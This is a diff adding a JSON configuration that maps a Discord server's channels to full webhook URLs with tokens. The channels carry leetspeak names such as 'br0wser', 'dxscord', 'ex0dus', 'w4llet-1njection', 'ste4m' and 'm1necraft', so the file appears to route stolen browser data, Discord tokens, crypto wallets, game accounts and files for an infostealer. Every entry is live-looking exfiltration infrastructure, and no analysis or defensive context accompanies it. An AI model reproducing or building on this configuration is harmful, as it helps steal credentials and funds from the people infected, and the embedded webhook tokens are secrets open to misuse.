@@ -1,0 +1,46 @@
+{
+  "serverID": "1383071671312846848",
+  "channels": {
+    "br0wser": {
+      "id": "1389851019516579940",
+      "webhookURL": "https://discord.com/api/webhooks/1389851020787716109/CDzibmvVTj7BmwuZgqwFx-zvtqvV48L6r1inV4mvet4H2L1sztZiWupJL4TL1ZpVchxn"
+    },
+    "dxscord": {
+      "id": "1389851023128137768",
+      "webhookURL": "https://discord.com/api/webhooks/1389851024155475989/vWspzoV--GrrQn0BFBwk9LlHKfjReR2IpJPVxtDTKHSSv7FZXf8P1IG9Nor4oN4ysLLF"
+    },
+    "ex0dus": {
+      "id": "1389851026554618028",
+      "webhookURL": "https://discord.com/api/webhooks/1389851027951583324/-bQ4ik8zY1GVr1lo6AapBxiTkXiljbXRlWWFc7N8yVpdwJzfXD3dfIb-cH53yuFcspPU"
+    },
+    "w4llet": {
+      "id": "1389851029306212402",
+      "webhookURL": "https://discord.com/api/webhooks/1389851030363312224/udtDCPsERiodGAeos5fv2YtYHknQwVyD8LZGQgaVpYib2-qf-jJ5O7ZRj3N85QtzXnzw"
+    },
+    "w4llet-1njection": {
+      "id": "1389851031931981939",
+      "webhookURL": "https://discord.com/api/webhooks/1389851033982730240/8XUY-UpGgx_5rLFf-ALRqJIy3wI-PhkYS3UB_Q9mSv83-Pa_iqErVpUO6RRyCHFDI99n"
+    },
+    "1njection": {
+      "id": "1389851035505393684",
+      "webhookURL": "https://discord.com/api/webhooks/1389851036922941492/uusT_79wS2a5Ic-0HIfh6Hs8zFFC6e7btkCu4boCzCMXPLIma7Y_G1ipLrrRNO8WHX-J"
+    },
+    "pan3lping": {
+      "id": "1389851038160388169",
+      "webhookURL": "https://discord.com/api/webhooks/1389851039246712913/GUejUxWw0MJRRrxbWijaO9kRI2bzD1pcH1O3LMOsGaI8SEvK72FfPr3bRxmjnWy6wvXl"
+    },
+    "ste4m": {
+      "id": "1389851041025101884",
+      "webhookURL": "https://discord.com/api/webhooks/1389851042690367519/RMeTePPqTJ2cgkSHm9dHO7ZsZiVlsv2ouaM0bDNXOVrLyguBTfXh52Q_SolkKYligyTj"
+    },
+    "f1les": {
+      "id": "1389851043789144084",
+      "webhookURL": "https://discord.com/api/webhooks/1389851045353492490/zYqlWE1QP-M12wjcqOCsSnEBOF7fxdAHGEErc_rPtuZMve3T2Rh9BBXx8_1FytL0t-VF"
+    },
+    "m1necraft": {
+      "id": "1389851046859378720",
+      "webhookURL": "https://discord.com/api/webhooks/1389851048503541873/_Pd1inbsDB5cK8m8OvgjuYJjpymKKabtSb9df4hzgQvoPF6W3TcskdKHyNk-S1MncJvv"
+    }
+  }
+}
+
